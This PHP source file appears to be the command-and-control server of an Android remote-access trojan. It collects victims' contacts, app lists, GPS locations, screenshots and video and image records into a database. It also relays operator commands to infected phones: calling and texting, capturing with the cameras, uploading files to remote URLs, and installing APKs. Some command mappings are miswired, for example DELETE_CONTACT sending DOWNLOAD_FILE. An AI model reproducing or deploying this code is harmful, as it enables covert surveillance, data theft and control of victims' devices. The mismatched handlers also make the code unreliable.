<?php

namespace C2;

use Ratchet\ConnectionInterface;
use Ratchet\RFC6455\Messaging\MessageInterface;
use Ratchet\WebSocket\MessageComponentInterface;

class C2WebSocket implements MessageComponentInterface {

    protected $clients;

    private ConnectionInterface $server;

    /** @var Database $database Database instance */
    private Database $database;

    public function __construct(Database $database)
    {
        $this->clients = new \SplObjectStorage();
        $this->database = $database;
    }

    public function onOpen(ConnectionInterface $conn)
    {
        $this->clients->attach($conn);
        if (isset($this->server)) {
            $currentDateTime = date('Y-m-d H:i:s');
            $response = [
                "color" => "text-success",
                "message" => "[" . $currentDateTime . "]: Connection estbalished by " . $conn->resourceId
            ];
            $this->server->send(json_encode($response));
        }
    }

    public function onMessage(ConnectionInterface $conn, MessageInterface $msg)
    {
        $data = json_decode($msg->getPayload());

        if ($data === null)
            return;

        if ($data->type === "js-server") {
            $this->server = $conn;
            $currentDateTime = date('Y-m-d H:i:s');
            $response = [
                "color" => "text-success",
                "message" => "[" .$currentDateTime . "]: Connection established successfully " . $conn->resourceId
            ];
            $conn->send(json_encode($response));
        } elseif ($data->type === 'client') {
            $this->clientConnection($conn, $data);
        } elseif ($data->type === 'server')
            $this->serverConnection($conn, $data);

        if (isset($data->res) && $data->res === 'id')
            return;

        if (isset($this->server)) {
            $currentDateTime = date('Y-m-d H:i:s');
            $response = [
                "color" => "text-light",
                "message" => "[" .$currentDateTime . "]: $conn->resourceId => " . json_encode($data)
            ];
            $this->server->send(json_encode($response));
        }
    }

    public function onClose(ConnectionInterface $conn)
    {
        $this->clients->detach($conn);
        if (isset($this->server)) {
            $currentDateTime = date('Y-m-d H:i:s');
            $response = [
                "color" => "text-danger",
                "message" => "[" .$currentDateTime . "]: Connection closed by " . $conn->resourceId
            ];
            $this->server->send(json_encode($response));
        }
    }

    public function onError(ConnectionInterface $conn, \Exception $e)
    {
        $conn->close();
    }

    /**
     * Handle client connections
     * 
     * @param ConnectionInterface $conn
     * @param $data
     */
    private function clientConnection(ConnectionInterface $conn, $data): void
    {
        $clientID = intval($data->id);

        switch ($data->res) {
            case "app_list":
                $apps = json_decode($data->data);
                foreach ($apps as $packageName => $appName) {
                    $query = "INSERT INTO INSTALLED_APP(client_id, package_name, app_name, timestamp) VALUES(?, ?, ?, ?)";
                    $this->database->insert($query, [$clientID, $packageName, $appName, $data->timestamp]);
                }
                break;
            case "contact":
                $query = "INSERT INTO CONTACT(client_id, name, number) VALUES(?, ?, ?)";
                $name = base64_decode($data->name);
                $number = base64_decode($data->number);
                $this->database->insert($query, [$clientID, $name, $number]);
                break;
            case "id":
                $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId);
                break;
            case "image":
                $query = "INSERT INTO IMAGE(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data->filename);
                $timestamp = $data->timestamp;
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            case "location":
                $query = "INSERT INTO LOCATION(client_id, latitude, longitude, altitude, timestamp) VALUES(?, ?, ?, ?, ?)";
                $latitude = floatval(base64_decode($data->latitude));
                $longitude = floatval(base64_decode($data->longitude));
                $altitude = floatval(base64_decode($data->altitude));
                $timestamp = $data->timestamp;
                $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude, $timestamp]);
                break;
            case "screenshot":
                $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data->filename);
                $timestamp = $data->timestamp;
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            case "video":
                $query = "INSERT INTO VIDEO(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data->filename);
                $timestamp = $data->timestamp;
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            default:
                break;
        }
    }

    /**
     * Handle connections from the server
     * 
     * @param ConnectionInterface $conn
     * @param $data
     */
    private function serverConnection(ConnectionInterface $conn, $data): void
    {
        $clientWebSocketID = $data->web_socket_id;
        $client = $this->getClient($clientWebSocketID);
        
        if (is_null($client))
            return;

        $json = null;

        if ($this->isClientConnected($clientWebSocketID)) {
            switch ($data->cmd) {
                case "CALL":
                    $json = json_encode([
                        "cmd" => "CALL",
                        "number" => $data->number,
                    ]);
                    break;
                case "CAMERA_BACK":
                    $json = json_encode(["cmd" => "CAMERA_BACK"]);
                    break;
                case "CAMERA_FRONT":
                    $json = json_encode(["cmd" => "CAMERA_FRONT"]);
                    break;
                case "DELETE_CONTACT":
                    $json = json_encode([
                        "cmd" => "DOWNLOAD_FILE",
                        "name" => $data->name,
                        "number" => $data->number
                    ]);
                    break;
                case "DOWNLOAD_FILE":
                    $json = json_encode([
                        "cmd" => "DOWNLOAD_FILE",
                        "url" => $data->url,
                        "filename" => $data->filename
                    ]);
                    break;
                case "INSTALL_APK":
                    $json = json_encode([
                        "cmd" => "INSTALL_APK",
                        "path" => $data->path
                    ]);
                    break;
                case "LAUNCH_APP":
                    $json = json_encode([
                        "cmd" => "LAUNCH_APP",
                        "package" => $data->package
                    ]);
                    break;
                case "LIST_INSTALLED_APPS":
                    $json = json_encode(["cmd" => "LIST_INSTALLED_APPS"]);
                    break;
                case "LIST_FILES":
                    $json = json_encode([
                        "cmd" => "VIDEO",
                        "path" => $data->path
                    ]);
                    break;
                case "LOCATION":
                    $json = json_encode(["cmd" => "LOCATION"]);
                    break;
                case "READ_CONTACTS":
                    $json = json_encode(["cmd" => "READ_CONTACTS"]);
                    break;
                case "SCREENSHOT":
                    $json = json_encode(["cmd" => "SCREENSHOT"]);
                    break;
                case "TEXT":
                    $json = json_encode([
                        "cmd" => "TEXT",
                        "number" => $data->number,
                        "message" => $data->message
                    ]);
                    break;
                case "UPLOAD_FILE":
                    $json = json_encode([
                        "cmd" => "UPLOAD_FILE",
                        "path" => $data->path,
                        "url" => $data->url
                    ]);
                    break;
                case "VIDEO":
                    $json = json_encode(["cmd" => "VIDEO"]);
                    break;
                case "WRITE_CONTACT":
                    $json = json_encode([
                        "cmd" => "WRITE_CONTACT",
                        "name" => $data->name,
                        "number" => $data->number
                    ]);
                    break;
                default;
                    break;
            }
            
            $client->send($json);
        }
    }

    /**
     * Check if a particular client is connected
     * 
     * @param int $webSocketConnectionID
     * 
     * @return bool
     */
    private function isClientConnected(int $webSocketConnectionID): bool
    {
        foreach ($this->clients as $client) {
            if ($client->resourceId === $webSocketConnectionID)
                return true;
        }

        return false;
    }

    /**
     * Get a client
     * 
     * @param int $webSocketConnectionID
     */
    private function getClient(int $webSocketConnectionID)
    {
        foreach ($this->clients as $client) {
            if ($client->resourceId === $webSocketConnectionID)
                return $client;
        }

        return null;
    }

    /**
     * Update client web socket ID in database
     * 
     * @param int $clientID
     * @param int $webSocketID
     */
    private function updateClientWebSocketIDinDatabase(int $clientID, int $webSocketID): void
    {
        $query = "UPDATE CLIENT SET web_socket_id=? WHERE id=?";
        $this->database->update($query, [$webSocketID, $clientID]);
    }
}
